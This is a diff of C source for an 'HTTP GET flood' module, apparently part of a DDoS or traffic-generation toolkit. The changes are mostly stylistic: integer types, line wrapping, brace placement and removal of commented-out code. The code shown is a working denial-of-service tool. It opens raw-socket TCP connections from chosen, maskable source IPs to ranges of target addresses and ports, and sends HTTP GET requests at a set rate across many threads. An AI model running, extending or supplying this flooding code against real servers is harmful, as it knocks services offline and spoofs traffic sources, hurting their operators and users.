@@ -8,24 +8,24 @@
 #define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
 
 // session counting
-unsigned long g_get_num_total;
-unsigned long g_get_num_generated_in_sec;
+__u64 g_get_num_total;
+__u64 g_get_num_generated_in_sec;
 // from main()
-char g_get_src_ip[16] = { 0, };
-char g_get_dest_ip[16] = { 0, };
-unsigned int g_get_src_mask;
-unsigned int g_get_dest_mask;
-unsigned int g_get_dest_port_start;
-unsigned int g_get_dest_port_end;
-unsigned int g_get_request_per_sec;
+unsigned char g_get_src_ip[16] = { 0, };
+unsigned char g_get_dest_ip[16] = { 0, };
+__u32 g_get_src_mask;
+__u32 g_get_dest_mask;
+__u32 g_get_dest_port_start;
+__u32 g_get_dest_port_end;
+__u32 g_get_request_per_sec;
 // thread
 pthread_mutex_t g_get_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_cond_t g_get_cond = PTHREAD_COND_INITIALIZER;
 
 // for masking next ip address
-char g_get_now_src_ip[16];
-char g_get_now_dest_ip[16];
-unsigned int g_get_now_dest_port;
+unsigned char g_get_now_src_ip[16];
+unsigned char g_get_now_dest_ip[16];
+__u32 g_get_now_dest_port;
 
 // time checking
 struct timespec g_get_before_time;
@@ -33,13 +33,16 @@ struct timespec g_get_now_time;
 // request msg
 char g_get_request_msg[__GET_REQUEST_MSG_SIZE__ ];
 
-void get_flood_print_usage(void) {
+void get_flood_print_usage(void)
+{
 	printf(
-			"get flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
+			"get flood Usage : "
+			"[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
 	return;
 }
 
-void* generate_get_flood(void *data) {
+void *generate_get_flood(void *data)
+{
 	srand(time(NULL));
 	int thread_id = *((int*) data);
 
@@ -47,73 +50,75 @@ void* generate_get_flood(void *data) {
 	while (1) {
 		// *** begin of critical section ***
 		pthread_mutex_lock(&g_get_mutex);
-
 		// wait a second
 		if (g_get_num_generated_in_sec >= g_get_request_per_sec) {
 			pthread_cond_wait(&g_get_cond, &g_get_mutex);
 		}
-
 		// get now resource
-		generator(g_get_src_ip, g_get_dest_ip, g_get_src_mask, g_get_dest_mask,
-				g_get_dest_port_start, g_get_dest_port_end, g_get_now_src_ip,
-				g_get_now_dest_ip, &g_get_now_dest_port);
-
+		generator(
+				g_get_src_ip,
+				g_get_dest_ip,
+				g_get_src_mask,
+				g_get_dest_mask,
+				g_get_dest_port_start,
+				g_get_dest_port_end,
+				g_get_now_src_ip,
+				g_get_now_dest_ip,
+				&g_get_now_dest_port);
 		// make and do tcp connection using raw socket
 		int src_port, seq, ack;
-		int sock = tcp_make_connection(inet_addr(g_get_now_src_ip),
-				inet_addr(g_get_now_dest_ip), &src_port, g_get_now_dest_port,
-				&seq, &ack,0);
-
-		//send HTTP GET method
-		tcp_socket_send_data(sock, inet_addr(g_get_now_src_ip),
-					inet_addr(g_get_now_dest_ip), src_port, g_get_now_dest_port,
-					GET_METHOD, strlen(GET_METHOD), seq, ack,0);
-
+		int sock = tcp_make_connection(
+				inet_addr(g_get_now_src_ip),
+				inet_addr(g_get_now_dest_ip),
+				&src_port,
+				g_get_now_dest_port,
+				&seq,
+				&ack,
+				0);
+		// send HTTP GET method
+		tcp_socket_send_data(
+				sock,
+				inet_addr(g_get_now_src_ip),
+				inet_addr(g_get_now_dest_ip),
+				src_port,
+				g_get_now_dest_port,
+				GET_METHOD,
+				strlen(GET_METHOD),
+				seq,
+				ack,
+				0);
 		// time checking
-		time_check(&g_get_mutex, &g_get_cond, &g_get_before_time,
-				&g_get_now_time, &g_get_num_generated_in_sec);
-
-		//session count
+		time_check(
+				&g_get_cond,
+				&g_get_before_time,
+				&g_get_now_time,
+				&g_get_num_generated_in_sec);
+		// session count
 		g_get_num_generated_in_sec++;
 		g_get_num_total++;
-
 		close(sock);
-
 		// *** end of critical section ***
-		pthread_mutex_unlock(&g_get_mutex);
-	}
-
-}
-
-void* get_flood_time_check(void *data) {
-	while (1) {
-		pthread_mutex_lock(&g_get_mutex);
-		time_check(&g_get_mutex, &g_get_cond, &g_get_before_time,
-				&g_get_now_time, &g_get_num_generated_in_sec);
 		pthread_mutex_unlock(&g_get_mutex);
 	}
 	return NULL;
 }
 
-void get_flood_main(char *argv[]) {
-	/*
-	 Will be implemented Later....
-	 FILE *get_f;
-	 get_f=fopen("./src/ddos/http_request.txt","rb");
-	 if(get_f==NULL)
-	 {
-	 perror("open error! does http_g_get_request_msg.txt exist?\n");
-	 exit(1);
-	 }
-	 char buffer[__GET_REQUEST_MSG_SIZE__];
-	 while(fgets(buffer,__GET_REQUEST_MSG_SIZE__,get_f)!=NULL)
-	 {
-	 strcat(g_get_request_msg,buffer);
-	 strcat(g_get_request_msg,"\r\n");
-	 }
-	 strcat(g_get_request_msg,"\r\n");
-	 fclose(get_f);
-	 */
+void *get_flood_time_check(void *data)
+{
+	while (1) {
+		pthread_mutex_lock(&g_get_mutex);
+		time_check(
+				&g_get_cond,
+				&g_get_before_time,
+				&g_get_now_time,
+				&g_get_num_generated_in_sec);
+		pthread_mutex_unlock(&g_get_mutex);
+	}
+	return NULL;
+}
+
+void get_flood_main(char *argv[])
+{
 	strcpy(g_get_request_msg, GET_METHOD);
 	printf("Requesting: \n%s\n", g_get_request_msg);
 	int argc = 0;
@@ -124,8 +129,14 @@ void get_flood_main(char *argv[]) {
 		get_flood_print_usage();
 		return;
 	}
-	split_ip_mask_port(argv, g_get_src_ip, g_get_dest_ip, &g_get_src_mask,
-			&g_get_dest_mask, &g_get_dest_port_start, &g_get_dest_port_end);
+	split_ip_mask_port(
+			argv,
+			g_get_src_ip,
+			g_get_dest_ip,
+			&g_get_src_mask,
+			&g_get_dest_mask,
+			&g_get_dest_port_start,
+			&g_get_dest_port_end);
 	g_get_num_generated_in_sec = 0;
 	g_get_num_total = 0;
 	memset(&g_get_before_time, 0, sizeof(struct timespec));
@@ -141,8 +152,11 @@ void get_flood_main(char *argv[]) {
 			g_get_dest_ip, num_threads, g_get_request_per_sec);
 	int i;
 	for (i = 0; i < num_threads; i++) {
-		pthread_create(&threads[i], NULL, generate_get_flood,
-				(void*) &thread_ids[i]);
+		pthread_create(
+				&threads[i],
+				NULL,
+				generate_get_flood,
+				(void *)&thread_ids[i]);
 	}
 	pthread_create(&threads[i], NULL, get_flood_time_check, NULL);
 	for (int i = 0; i < num_threads; i++) {
